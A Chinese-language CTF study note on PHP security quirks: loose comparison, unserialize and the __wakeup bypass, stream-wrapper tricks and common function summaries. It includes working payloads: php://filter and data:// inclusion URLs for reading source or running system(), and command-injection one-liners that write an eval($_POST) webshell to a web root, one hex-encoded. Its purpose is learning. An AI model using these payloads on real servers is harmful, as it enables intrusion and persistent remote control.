# PHP 相关

## php弱类型

`===`会先比较两个变量的类型是否相同，在比较数值

`==`在比较的时候，会将两个变量转换为相同的类型，再比较

```text
如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行
```

hash比较缺陷

```php
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada"  //false
"0e1abc"=="0"     //true
```

**在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。如果不满足0e\d+这种模式，就会当作字符串进行比较，所以不会相等。**

十六进制转换

```php
"0x1e240"=="123456"     //true
"0x1e240"==123456       //true
"0x1e240"=="1e240"      //false
```

当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较。

类型转换

```php
<?php
$test=1 + "10.5"; // $test=11.5(float)
$test=1+"-1.3e3"; //$test=-1299(float)
$test=1+"bob-1.3e3";//$test=1(int)
$test=1+"2admin";//$test=3(int)
$test=1+"admin2";//$test=1(int)
?>
```

PHP手册：**当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含`'.','e','E'`并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。**

md5\(\)

```php
$array1[] = array("foo" => "bar", "bar" => "foo",);
$array2 = array("foo", "bar", "hello", "world");

var_dump(md5($array1)==var_dump($array2));  //true
```

PHP手册中的md5\(\)函数的描述是`string md5 ( string $str [, bool $raw_output = false ] )`，md5\(\)中的需要是一个string类型的参数。但是当你传递一个array时，md5\(\)不会报错，只是会无法正确地求出array的md5值，并且返回`NULL`。这样就会导致任意2个array的md5值都会相等。

## 序列化

所有php里面的值都可以使用函数`serialize()`来返回一个包含**字节流的字符串来表示**。

`unserialize()`函数能够**重新把字符串变回php原来的值**。

序列化一个对象将会**保存对象的所有变量**，但是**不会保存对象的方法**，只会保存类的名字。

为了能够`unserialize()`一个对象，**这个对象的类必须已经定义过**。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数`spl_autoload_register()`来实现。

**\_\_sleep\(\)**

serialize\(\) 函数会检查类中是否存在一个魔术方法 \_\_sleep\(\)。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E\_NOTICE 级别的错误。

对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。

**\_\_wakeup\(\)**

unserialize\(\) 会检查是否存在一个 \_\_wakeup\(\) 方法。如果存在，则会先调用 \_\_wakeup 方法，预先准备对象需要的资源。

预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

```php
a - array
b - boolean
d - double
i - integer
o - common object
r - reference
s - string
C - custom object
O - class
N - null
R - pointer reference
U - unicode string
```

* CVE-2016-7124漏洞，当序列化字符串中**表示对象属性个数的值**大于**真实的属性个数时**会跳过\_\_wakeup的执行

```php
<?php
    class Student{
        private $name = "casuall";
        private $age = 18;
        public function __wakeup(){
            echo "wakeup is called";
            echo "<br/>";
        }
    }

    $a = new Student;
    $ser = serialize($a);
    echo $ser . "<br/>";

    $unser = unserialize($ser);

    // output:
    // O:7:"Student":2:{s:13:"Studentname";s:7:"casuall";s:12:"Studentage";i:18;}
  // wakeup is called
  // 其中:2:中的2表示对象属性个数，其余的遵循 “类型：长度：值” 的格式
?>
```

## php伪协议

php:// — 访问各个输入/输出流（I/O streams）

* **php://input** 是个可以访问请求的原始数据的只读流.CTF中经常使用`file_get_contents`获取`php://input`内容\(POST\)，需要开启`allow_url_include`，并且当`enctype="multipart/form-data"`的时候 **php://input是无效**的。
  * **利用方式：**`?file=php://input` 数据利用`POST`传过去
  * 碰到**file\_get\_contents\(\)**就要想到用**php://input**绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。

    ```php
    ?user=php://input&file=php://filter/convert.base64-encode/resource=class.php
    ?user=php://input&file=php://filter/convert.base64-encode/resource=index.php
    ?user=php://input&file=class.php&pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}
    ```
* **php://output** 是一个只写的数据流， 允许你以print和 echo 一样的方式 写入到输出缓冲区。
* **php://filter**  `php://filter` 是一种元封装器， 设计用于数据流打开时的[筛选过滤](https://www.php.net/manual/zh/filters.php)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile\(\)](https://www.php.net/manual/zh/function.readfile.php)、 [file\(\)](https://www.php.net/manual/zh/function.file.php) 和 [file\_get\_contents\(\)](https://www.php.net/manual/zh/function.file-get-contents.php)， 在数据流内容读取之前没有机会应用其他过滤器。

bugku flag在index里（[http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php）](http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php）)



 `php://filter` 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。



| 名称 | 描述 |
| :--- | :--- |
| _resource=&lt;要过滤的数据流&gt;_ | 这个参数是必须的。它指定了你要筛选过滤的数据流。 |
| _read=&lt;读链的筛选列表&gt;_ | 该参数可选。可以设定一个或多个过滤器名称，以管道符（_\|_）分隔。 |
| _write=&lt;写链的筛选列表&gt;_ | 该参数可选。可以设定一个或多个过滤器名称，以管道符（_\|_）分隔。 |
| _&lt;；两个链的筛选列表&gt;_ | 任何没有以 _read=_ 或 _write=_ 作前缀          的筛选器列表会视情况应用于读或写链。 |

```php
<?php
/* 这会以大写字母输出 www.example.com 的全部内容 */
readfile("php://filter/read=string.toupper/resource=http://www.example.com");

/* 这会和以上所做的一样，但还会用 ROT13 加密。 */
readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
?>
```

```text
  # 字符串过滤器
  string.rot13
  进行rot13转换

  string.toupper
  将字符全部大写

  string.tolower
  将字符全部小写

  string.strip_tags
  去除空字符、HTML 和 PHP 标记后的结果。
  功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。

  # 转换过滤器

  convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了 line-length，base64 输出将被用 line-length个字符为 长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同

  convert.quoted-printable-encode和 convert.quoted-printable-decode使用此过滤器的 decode 版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外， convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。
```

以下命令常用来读取文件

```php
  ?file=php://filter/read=convert.base64-encode/resource=index.php
```

* **data://**

  php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码

  用法：

  `data://text/plain;base64,`

  `<?php system("dir")?>` base64编码后使用

  `http://localhost/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b`\(注意编码后的+号要URL编码\)

## php中大小写敏感规则

* 区分大小写的：变量名、常量名、数组索引
* 不区分大小写的：函数名、方法名、类名、魔术常量、NULL、TRUE、FALSE、强制类型转换

## php探针

php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。

一个比较常见的探针是**雅黑PHP探针**，默认地址是**tz.php**。

## php短标签

在php的配置文件php.ini中有一个`short_open_tag`的值，开启以后可以使用PHP的短标签：`<? ?>`。同时，只有开启这个才可以使用 `<?=` 以代替 `<? echo`。不过**在php7中这个标签被移除了**。

## extract变量覆盖

extract\(\) 函数从数组中将变量导入到当前的符号表。语法：extract\(array,extract\_rules,prefix\)


## PHP 超级全局变量

* `$GLOBALS` 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。

  `$GLOBALS`是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

* `$_SERVER` 是一个包含了诸如头信息（`header`）、路径（`path`）、以及脚本位置（`script locations`）等等信息的数组。

  下表列出了所有`$_SERVER`变量中的重要元素：

  | 元素/代码 | 描述 |
  | :--- | :--- |
  | $\_SERVER\['PHP\_SELF'\] | 当前执行脚本的文件名，与 document root 有关。例如，在地址为  [http://example.com/test.php/foo.bar](http://example.com/test.php/foo.bar) 的脚本中使用 $_SERVER\['PHPSELF'\] 将得到  /test.php/foo.bar。\_\_FILE_ 常量包含当前\(例如包含\)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果  PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 |
  | $\_SERVER\['GATEWAY\_INTERFACE'\] | 服务器使用的 CGI 规范的版本；例如，"CGI/1.1"。 |
  | $\_SERVER\['SERVER\_ADDR'\] | 当前运行脚本所在的服务器的 IP 地址。 |
  | $\_SERVER\['SERVER\_NAME'\] | 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。\(如: www.runoob.com\) |
  | $\_SERVER\['SERVER\_SOFTWARE'\] | 服务器标识字符串，在响应请求时的头信息中给出。 \(如：Apache/2.2.24\) |
  | $\_SERVER\['SERVER\_PROTOCOL'\] | 请求页面时通信协议的名称和版本。例如，"HTTP/1.0"。 |
  | $\_SERVER\['REQUEST\_METHOD'\] | 访问页面使用的请求方法；例如，"GET", "HEAD"，"POST"，"PUT"。 |
  | $\_SERVER\['REQUEST\_TIME'\] | 请求开始时的时间戳。从 PHP 5.1.0 起可用。 \(如：1377687496\) |
  | $\_SERVER\['QUERY\_STRING'\] | query string（查询字符串），如果有的话，通过它进行页面访问。 |
  | $\_SERVER\['HTTP\_ACCEPT'\] | 当前请求头中 Accept: 项的内容，如果存在的话。 |
  | $\_SERVER\['HTTP\_ACCEPT\_CHARSET'\] | 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如："iso-8859-1,\*,utf-8"。 |
  | $\_SERVER\['HTTP\_HOST'\] | 当前请求头中 Host: 项的内容，如果存在的话。 |
  | $\_SERVER\['HTTP\_REFERER'\] | 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP\_REFERER 的功能。简言之，该值并不可信。\) |
  | $\_SERVER\['HTTPS'\] | 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。 |
  | $\_SERVER\['REMOTE\_ADDR'\] | 浏览当前页面的用户的 IP 地址。 |
  | $\_SERVER\['REMOTE\_HOST'\] | 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE\_ADDR。 |
  | $\_SERVER\['REMOTE\_PORT'\] | 用户机器上连接到 Web 服务器所使用的端口号。 |
  | $\_SERVER\['SCRIPT\_FILENAME'\] | 当前执行脚本的绝对路径。 |
  | $\_SERVER\['SERVER\_ADMIN'\] | 该值指明了 Apache 服务器配置文件中的 SERVER\_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。\(如：someone@runoob.com\) |
  | $\_SERVER\['SERVER\_PORT'\] | Web 服务器使用的端口。默认值为 "80"。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 |
  | $\_SERVER\['SERVER\_SIGNATURE'\] | 包含了服务器版本和虚拟主机名的字符串。 |
  | $\_SERVER\['PATH\_TRANSLATED'\] | 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 |
  | $\_SERVER\['SCRIPT\_NAME'\] | 包含当前脚本的路径。这在页面需要指向自己时非常有用。\__FILE\__ 常量包含当前脚本\(例如包含文件\)的完整路径和文件名。 |
  | $\_SERVER\['SCRIPT\_URI'\] | URI 用来指定要访问的页面。例如 "/index.html"。 |

* `$_REQUEST` 用于收集HTML表单提交的数据。
* `$_POST` 被广泛应用于收集表单数据，在_HTML form_标签的指定该属性：`method=”post“`
* `$_GET` 同样被广泛应用于收集表单数据，在_HTML form_标签的指定该属性：`method="get"`。
* `$_FILES` \[用于文件就收的处理img 最常见\]
* `$_COOKIE` \[用于获取与`setCookie()`中的`name` 值\]
* `$_SESSION` \[用于存储`session`的值或获取`session`中的值\]
* `$_ENV` \[ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它\]

## PHP 常见函数

### PHP is\_numeric\(\) 函数

**is\_numeric\(\)** 函数用于检测变量是否为_数字_或_数字字符串_。

```php
bool is_numeric ( mixed $var )
//如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。
```

### ini\_set\(\)函数

```php
ini_set("display_errors","0");
```

设置错误报告等级，不显示错误报告

### set\_time\_limit（）函数

```php
set_time_limit(0);
```

设置脚本最大执行时间，单位为秒，如果设置为0（零），没有时间方面的限制。

### set\_magic\_quotes\_runtime（）函数

```php
set_magic_quotes_runtime(0)
```

set\_magic\_quotes\_runtime 用来设置php.ini文件中的magic\_quotes\_runtime值，当遇到反斜杆（\）、单引号（'）、双引号（"）这样一些的字符定入到数据库里，又不想被过滤掉，使用这个函数，将会自动加上一个反斜杆（\），保护系统和数据库的安全。

magic\_quotes\_runtime 是php.ini里的环境配置变量，0和false表示关闭本功能,1和true表示打开本功能。

### base64\_decode\(\)

解码base64

### str\_replace\(\)

```php
str_replace("\r","",$c);
```

将变量c中的回车符替换为空

该函数必须遵循下列规则：

* 如果搜索的字符串是数组，那么它将返回数组。
* 如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。
* 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换
* 如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。

注释：该函数区分大小写。请使用 `str_ireplace()` 函数执行不区分大小写的搜索。

### strrev\(\)

反转字符串

### stripslashes

反引用一个引用字符串

#### 原型

```php
stripslashes ( string $str ) : string
```

#### 返回值

返回一个去除转义反斜线后的字符串（_\'_ 转换为 _'_ 等等）。双反斜线（_\\_）被转换为单个反斜线（_\_）。

### substr\(\)

substr\(\) 函数返回字符串的一部分

```php
substr(string,start,length)
```

### fnmatch

用模式匹配文件名

#### 原型

```php
fnmatch ( string $pattern , string $string [, int $flags = 0 ] ) : bool
```

**fnmatch\(\)** 检查传入的 `string` 是否匹配给出的 shell 统配符 `pattern`。

匹配则返回 **TRUE**，否则返回 **FALSE**。

### shell\_exec

通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。

#### 原型

```php
 shell_exec ( string $cmd ) : string
```

windows下连接命令的符号：**&&、&、\|、\|\|**命令拼接符号的区别

* A&B  简单的拼接，AB之间无制约关系
* A&&B   A执行成功，然后才会执行B
* A\|B  A的输出，作为B的输入
* A\|\|B  A执行失败，然后才会执行B

windows下命令注入写webshell：

用^转义&lt;

```php
echo ^<?php eval($_POST[pass]); ?^> > web目录shell.php
```

如果加上单引号会写不进去，如果加双引号会把双引号一起写进去，所以要用^转义&lt;

```php
echo '<?php eval($_POST[pass]); ?>' > web目录shell.php
```

linux下命令注入写webshell：

linux下需要用单引号来转义&lt;，不过很多php都默认开启gpc，可以先用16进制转换一句话再用xxd命令把16进制还原.

```php
echo '<?php eval($_POST[pass]);>' > web目录/shell.php
```

```php
echo 3c3f706870206576616c28245f504f53545b706173735d293b3e|xxd -r -ps > web目录/shell.php
```

### fwrite\(\)

fwrite\(\) 函数写入文件，fwrite\(\) 把 _string_ 的内容写入文件指针 _file_ 处。 如果指定了 _length_，当写入了 _length_ 个字节或者写完了 _string_ 以后，写入就会停止，视乎先碰到哪种情况。

```php
fwrite(file,string,length)
```

### ignore\_user\_abort\(\)

设置与客户机断开是否会终止脚本的执行。

如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。

如果未设置该参数，会返回当前的设置。

### unlink（）

删除文件。

如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。

### \_\_FILE\_\_

取得当前文件的绝对地址，结果：D:\www\test.php

### file\_put\_contents\(\)

将一个字符串写入文件

```php
 file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
```

### file\_get\_contents\(\)

把整个文件读入一个字符串中

#### 原型

```php
 file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] ) : string
```

### trim\(\)

去除字符串首尾处的空白字符（或者其他字符）

#### 原型

```php
 trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] ) : string
```

### PHP 暂停函数 sleep\(\) 与 usleep\(\) 的区别

在PHP中暂停代码执行一定时间，有两个函数可以实现，一个是`sleep()`，另一个是`usleep()`，它们参数都是一个整数值。sleep\(\)是暂停**多少秒**，usleep\(\)是暂停**多少微秒**。

**注意：**usleep\(\)单位是微秒，1秒 = 1000毫秒 ，1毫秒 = 1000微秒，即1微秒等于百万分之一秒。

### extract\(\)

从数组中将变量导入到当前的符号表

#### 原型

```php
 extract ( array &$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) : int
```

#### 参数

* `array`

  一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量，并受到 `flags` 和 `prefix` 参数的影响。 必须使用关联数组，数字索引的数组将不会产生结果，除非用了 **EXTR\_PREFIX\_ALL** 或者 **EXTR\_PREFIX\_INVALID**。

* `flags`

  对待非法／数字和冲突的键名的方法将根据取出标记 `flags` 参数决定。可以是以下值之一

  **EXTR\_OVERWRITE** 如果有冲突，覆盖已有的变量。 **EXTR\_SKIP** 如果有冲突，不覆盖已有的变量。 **EXTR\_PREFIX\_SAME** 如果有冲突，在变量名前加上前缀 `prefix`。 **EXTR\_PREFIX\_ALL** 给所有变量名加上前缀 `prefix`。 **EXTR\_PREFIX\_INVALID** 仅在非法／数字的变量名前加上前缀 `prefix`。

  **EXTR\_IF\_EXISTS** 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。举个例子，以下情况非常有用：定义一些有效变量，然后从 [$\_REQUEST](https://www.php.net/manual/zh/reserved.variables.request.php) 中仅导入这些已定义的变量。

  **EXTR\_PREFIX\_IF\_EXISTS** 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。

  **EXTR\_REFS** 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 `array` 参数的值。可以单独使用这个标志或者在 `flags` 中用 OR 与其它任何标志结合使用。

  如果没有指定 `flags`，则被假定为 **EXTR\_OVERWRITE**。

* `prefix`

  注意 `prefix` 仅在 `flags` 的值是 **EXTR\_PREFIX\_SAME**，**EXTR\_PREFIX\_ALL**，**EXTR\_PREFIX\_INVALID** 或 **EXTR\_PREFIX\_IF\_EXISTS** 时需要。

  如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。

### strpos\(\)

用于检索字符串内指定的字符或文本。找到，则返回首个匹配的字符位置。如果未找到匹配，则返回false。

#### 实例

查找“php”在字符串第一次出现的位置：

```php
<?php
echo strpos("You love php, I love php too!","php");
?>
```

ereg函数**存在NULL截断漏洞**，导致了正则过滤被绕过,所以**可以使用%00截断**正则匹配

### strrpos

计算指定字符串在目标字符串中最后一次出现的位置

#### 原型

```php
strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int
```

返回字符串 `haystack` 中 `needle` 最后一次出现的数字位置。

### stristr\(\)

stristr\(\) 函数搜索字符串在另一字符串中的第一次出现。

#### 语法

```php
stristr(string,search,before_search)
```

#### 参数

* string 必需。规定被搜索的字符串。
* search 必需。规定要搜索的字符串。**如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。**
* _before\_search_ 可选。默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 _search_ 参数第一次出现之前的字符串部分。

#### 实例

查找 "world" 在 "Hello world!" 中的第一次出现，并返回字符串的剩余部分：

```php
<?php
echo stristr("Hello world!","WORLD");
?>
world!
```


### 过滤器

* filter\_var\(\) - 通过一个指定的过滤器来过滤单一的变量
* filter\_var\_array\(\) - 通过相同的或不同的过滤器来过滤多个变量
* filter\_input - 获取一个输入变量，并对它进行过滤
* filter\_input\_array - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤
* Validating 和 Sanitizing

  有两种过滤器：

  Validating 过滤器：

  用于验证用户输入

  严格的格式规则（比如 URL 或 E-Mail 验证）

  如果成功则返回预期的类型，如果失败则返回 FALSE

  Sanitizing 过滤器：

  用于允许或禁止字符串中指定的字符

  无数据格式规则

  始终返回字符串

### php\_uname

返回运行 PHP 的系统的有关信息

#### 原型

```php
 php_uname ([ string $mode = "a" ] ) : string
```

**php\_uname\(\)** 返回了运行 PHP 的操作系统的描述。这和 [phpinfo\(\)](https://www.php.net/manual/zh/function.phpinfo.php) 最顶端上输出的是同一个字符串。

#### 参数

 `mode` 是单个字符，用于定义要返回什么信息：

* _'a'_：此为默认。包含序列 _"s n r v m"_ 里的所有模式。                   
* _'s'_：操作系统名称。例如：            _FreeBSD_。                   
* _'n'_：主机名。例如：           _localhost.example.com_。                   
* _'r'_：版本名称，例如：           _5.1.2-RELEASE_。                   
* _'v'_：版本信息。操作系统之间有很大的不同。                   
* _'m'_：机器类型。例如：_i386_。              

### basename

返回路径中的文件名部分。

#### 原型

```php
 basename ( string $path [, string $suffix ] ) : string
```

给出一个包含有指向一个文件的全路径的字符串，本函数返回基本的文件名。

如果文件名是以`suffix` 结束的，那这一部分也会被去掉。

### ereg\(\)

正则表达式匹配

#### 原型

```php
 ereg ( string $pattern , string $string [, array &$regs ] ) : int
```

以区分大小写的方式在 `string`中寻找与给定的正则表达式 `pattern` 所匹配的子串。

如果找到与 `pattern`中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 `regs`，则匹配项将被存入`regs` 数组中。$regs\[1\]包含第一个左圆括号开始的子串，$regs\[2\] 包含第二个子串，以此类推。$regs\[0\] 包含整个匹配的字符串。

### preg\_replace

执行一个正则表达式的搜索和替换

```php
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
```

搜索**subject**中匹配**pattern**的部分， 以**replacement**进行替换。

### include

* 服务器端包含 \(SSI\) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。
* include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。
* `include`与`require`的区别：
  * require **会生成致命错误**（E\_COMPILE\_ERROR）并停止脚本
  * include **只生成警告**（E\_WARNING），并且脚本会继续

### $\_FILES

HTTP 文件上传变量,通过 HTTP POST 方式上传到当前脚本的项目的数组。

* [$\_FILES\['userfile'\]\['name'\]](https://www.php.net/manual/zh/reserved.variables.files.php)

   客户端机器文件的原名称。

* [$\_FILES\['userfile'\]\['type'\]](https://www.php.net/manual/zh/reserved.variables.files.php)

   文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“_image/gif_”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。

* [$\_FILES\['userfile'\]\['size'\]](https://www.php.net/manual/zh/reserved.variables.files.php)

   已上传文件的大小，单位为字节。

* [$\_FILES\['userfile'\]\['tmp\_name'\]](https://www.php.net/manual/zh/reserved.variables.files.php)

   文件被上传后在服务端储存的临时文件名。

* [$\_FILES\['userfile'\]\['error'\]](https://www.php.net/manual/zh/reserved.variables.files.php)

   和该文件上传相关的[错误代码](https://www.php.net/manual/zh/features.file-upload.errors.php)。此项目是在 PHP 4.2.0 版本中增加的。

### move\_uploaded\_file

将上传的文件移动到新位置

#### 原型

```php
 move_uploaded_file ( string $filename , string $destination ) : bool
```

本函数检查并确保由 `filename`指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST上传机制所上传的）。如果文件合法，则将其移动为由`destination` 指定的文件。

### 操作文件的函数

* readfile\(\)函数 读取文件，并把它写入输出缓冲
* fopen\(\)函数 打开文件
* fread\(\)和上面的函数一样，会以一种模式（r，w，a，x，r+，w+，a＋，x＋）来执行后续的动作。
* fclose 关闭文件
* fgets\(\) 读取单行文件
* feof\(\) 检测是否到达文件末尾
* fgets\(\)读取单个字符
* fwrite\(\)写入文件
* 上传脚本

  创建上传脚本

  “upload\_file.php”文件含有供上传文件的代码：

  ```php
  <?php
      if ($_FILES["file"]["error"] > 0)
      {
          echo "Error: " . $_FILES["file"]["error"] . "<br />";
      }
      else
      {
           echo "Upload: " . $_FILES["file"]["name"] . "<br />";
           echo "Type: " . $_FILES["file"]["type"] . "<br />";
           echo "Size: " . ($_FILES["file"]["size"] / 1024) . "Kb<br />";
           echo "Stored in:" . $_FILES["file"]["tmp_name"];
      }
  ?>
  ```

  通过使用PHP的全局数组$\_FILES,你可以从客户计算机向远程服务器上传文件。

  第一个参数是表单的input name，第二个下标可以是“name”，“type”，“size”，“tmp\_name”或“error”。就像这样：

  * $\_FILES\["file"\]\["name"\] - 被上传文件的名称
  * $\_FILES\["file"\]\["type"\] - 被上传文件的类型
  * $\_FILES\["file"\]\["size"\] - 被上传文件的大小，以字节计
  * $\_FILES\["file"\]\["tmp\_name"\] - 存储在服务器的文件的临时副本的名称
  * $\_FILES\["file"\]\["error"\] - 由文件上传导致的错误代码

这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关什么用户有权上传文件的限制。
## PHP常量

如需设置常量，请使用`define()`函数 - 它使用三个参数：

1. 首个参数定义常量的名称
2. 第二个参数定义常量的值
3. 可选的第三个参数规定常量名是否对大小写不敏感。默认是fasle，false表示大小写敏感。

下例创建了一个_对大小写敏感的常量_，值为 "Welcome to W3School.com.cn!"：

```php
<?php
define("GREETING", "Welcome to W3School.com.cn!");
echo GREETING;
?>
```